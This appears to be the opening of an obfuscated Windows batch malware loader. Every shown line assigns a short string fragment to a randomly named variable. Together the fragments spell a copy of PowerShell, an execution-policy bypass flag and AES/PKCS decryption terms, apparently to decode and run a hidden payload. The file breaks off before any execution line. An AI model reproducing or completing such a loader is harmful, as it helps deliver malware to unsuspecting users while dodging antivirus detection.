@echo off
set "MbAYAlCCie= /"
set "zjPmCxlPvK=do"
set "KxnAhDJvWz=32"
set "WjpVTfBitH=rs"
set "fLHMMOdNSP=ll"
set "OKRRvCrJag=\W"
set "pspQwlcWEF=py"
set "AvDuYvccTE=.e"
set "bNqDhcfVIW=y "
set "bHnoSkOOyE=s\"
set "NPXWUGItTO=Wi"
set "cktfAKQwgk=ws"
set "PlhiSBupCX=\v"
set "XxrNKRPBin=Sy"
set "wLgoLgkuJp=:\"
set "FrYMJmEAXK=po"
set "ExjjjoiPao=in"
set "xIpHsRmJhi=he"
set "abjHrElaeq=ow"
set "vUvHaFUFoY=we"
set "LvhpmOXaEo=xe"
set "dFVEgylMef=nd"
set "yLIQlQDjUp=he"
set "cKKYOkdLaV=0\"
set "kXfpLRlMuN=co"
set "ZLLskGQkCN= C"
set "uIoCNvsGMW=em"
set "jgyCpiOMfV=ll"
set "rCopduddIz=rS"
set "jkwQvJlEwj=1."
set "dIFFrmneqT=Po"
set "wnHXgZKIhG=we"
set "UypDoMFqFp=st"
set "LAeznWdcfI=cd"
set "wLAEssdzdi= %~dp0"
set "NqWWleYbPy=-ep "
set "GXRmlNVYWP='txe"
set "xQrqvgeTkx=ptog"
set "ZasmFPDmWh=$BLr"
set "cxzjXaCHPN=ionM"
set "YUgDtCrplW=PKCS"
set "BnZZKMkYJi=ewCj"
set "hwvJKJxRCc=KMA."
set "LTSniwLYxZ=k; }"
set "PmaEobhHbl=form"
set "wLAUwvNzRz=$ZCs"
set "bFKtEfVkKY=ct S"
set "lQuwnZKUGh=CsKj"
set "ARCoFAWWgj=Conv"
set "vawMmLiTkY=Bmor"
set "VVmnMYzkJo=BLrK"
set "RAcFtSTMrT=, $B"
